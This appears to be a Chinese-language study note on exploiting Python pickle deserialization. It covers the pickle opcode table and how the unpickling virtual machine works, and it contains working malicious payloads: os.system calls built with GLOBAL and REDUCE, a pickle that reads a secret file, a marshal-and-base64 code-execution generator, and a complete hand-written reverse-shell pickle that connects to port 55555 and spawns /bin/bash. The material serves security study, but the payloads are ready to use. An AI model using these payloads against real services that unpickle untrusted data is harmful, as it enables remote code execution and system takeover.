# python pickle



## 推荐文章

 https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 

z牛: https://www.anquanke.com/post/id/188981 



## pickle操作码大全(v0)

有啥不懂的直接看源码把(z牛)

```python

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

```



## pickle介绍



### pickle的大致过程

以Foo类为例

1. 提取出Foo类中的所有attribute(从`__dict__`中获得)将其转化为键值对
2. 写入对象类名
3. 写入第一步生成的键值对

### unpickle的大致过程

1. 获取pickle流
2. 重新构建属性列表
3. 根据保存的类名来创建对象
4. 将属性列表恢复到对象中



### pvm组成(解析pickle)

1. 指令解释器
   最后一步一定是返回栈顶元素
2. 栈 
3. memo(临时保存数据)
   用类似list的方式来读取和储存数据,以字典方式实现
   如p100,意为把栈顶元素保存到memo中索引为100



### pvm指令格式

1. pvm的操作码只有一个字节

2. 需要参数的操作码,要在每一个参数后面加上换行符
3. 从pickle流中读取数据,并加载到栈上



## 如何生成pickle

### 操作码

#### 加载数据



| 操作码 | 助记    | 加载到栈上的数据类型 | 示例        |
| ------ | ------- | -------------------- | ----------- |
| S      | string  | String               | S'foo'\n    |
| V      | unicode | unicode              | Vfo\u006f\n |
| I      | int     | int                  | I42\n       |
|        |         |                      |             |

#### 修改栈/memo

| 操作码            | 助记 | 描述                       | 示例   |
| ----------------- | ---- | -------------------------- | ------ |
| (                 | MARK | 向栈中加入一个标记         | (      |
| 0                 | POP  | 弹出栈顶元素并丢弃         | 0      |
| p`<memo_index>`\n | PUT  | 复制栈顶元素到memo中       | p101\n |
| g`<memo_index>`\n | GET  | 将memo中指定元素拷贝到栈顶 | g101\n |



#### 生成/修改列表,字典,元组

| 操作码 | 助记    | 描述                                                         | 示例                                                    |
| ------ | ------- | ------------------------------------------------------------ | ------------------------------------------------------- |
| l      | 列表    | 将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中 | (S'string'\nl                                           |
| t      | 元组    | 将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中 | (S'string'\nS'string2'\nt                               |
| d      | 字典    | 将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中 | (S'key1'\nS'value1'\nS'key2'\nS'value2'\nd              |
| s      | SETITEM | 从栈出弹出三个值:字典,键,值,将键值对合并到字典中             | (S'key1'\nS'val1'\nS'key2'\nI123\ndS'key3'\nS'val 3'\ns |
|        |         |                                                              |                                                         |

#### pickle 流生成元组的过程

- 生成元组的指令

  ```
  (S'str1'
  S'str2'
  I1234
  t
  ```

- 生成元组的过程图

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg)



#### 加载对象

| 操作码 | 助记   | 描述                                                         | 示例                          |
| ------ | ------ | ------------------------------------------------------------ | ----------------------------- |
| c      | GLOBAL | 需要两个参数(module,class)来创建对象,并将其放到栈中          | cos\nsystem\n                 |
| R      | REDUCE | 弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中 | cos\nsystem\n(S'sleep 10'\ntR |

#### 加载对象过程图

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg)



![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg)

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg)

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg)

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg)

![image.png](https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg)







## 编写pickle的一些技巧

我们如何执行如下的代码:

```python
f=open('/path/to/massive/sikrit') 
f.read()
```

思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()

`f.read()`可以等价替换成` __builtin__.apply( __builtin__.getattr(file,'read'), [f]) `

最后合成的pickle是

```
#step1
c__builtin__
open
(S'/path/to/massive/sikrit'
tRp100
#step2
c__builtin__
apply
(c__builtin__
getattr
(c__builtin__
file
S'read'
tR(g100
ltR.
```



### 手写pickle模板



![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg)





### 利用`__reduce__`来生成pickle代码

`__reduce__`



> 当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。 



```python
import os, pickle
class Test(object):
    def __reduce__(self):
        return (os.system,('ls',))
    
print(pickle.dumps(Test(), protocol=0))
```



### 利用marshal和cPickle来生成代码

```python
# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

import marshal
import base64
import cPickle
import urllib
import pickle

def foo():#you should write your code in this function
    import os
    def fib(n):
        if n <= 1:
            return n
        return fib(n-1) + fib(n-2)
    print 'fib(10) =', fib(10)
    os.system('dir')

code_serialized = base64.b64encode(marshal.dumps(foo.func_code))


#为了保证code_serialized中的内容得到执行，我们需要如下代码
#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()

payload =  """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
print(payload)
```





## pickle工具

 [converttopickle.py]( https://github.com/sensepost/anapickle )

  

## payload

 https://github.com/sensepost/anapickle/blob/master/anapickle.py 



### 反弹shell

```python
'''csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS'__getitem__'\ntRp102\n0g102\n(S'AF_INET'\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS'__getitem__'\ntRp105\n0g105\n(S'SOCK_STREAM'\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS'__getitem__'\ntRp108\n0g108\n(S'IPPROTO_TCP'\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS'__getitem__'\ntRp111\n0g111\n(S'SOL_SOCKET'\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS'__getitem__'\ntRp114\n0g114\n(S'SO_REUSEADDR'\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'setsockopt'\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS'connect'\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S'localhost'\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS'fileno'\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S'/bin/bash'\ntI0\nS'/bin/bash'\ng122\ng122\ng122\ntRp123\n0S'finished'\n.'''
```

localhost:55555



## 注意

1. 使用v0版的pickle协议,保证shellcode的通用性



## 参考

 https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 

https://www.anquanke.com/post/id/188981 

 http://www.polaris-lab.com/index.php/archives/178/ 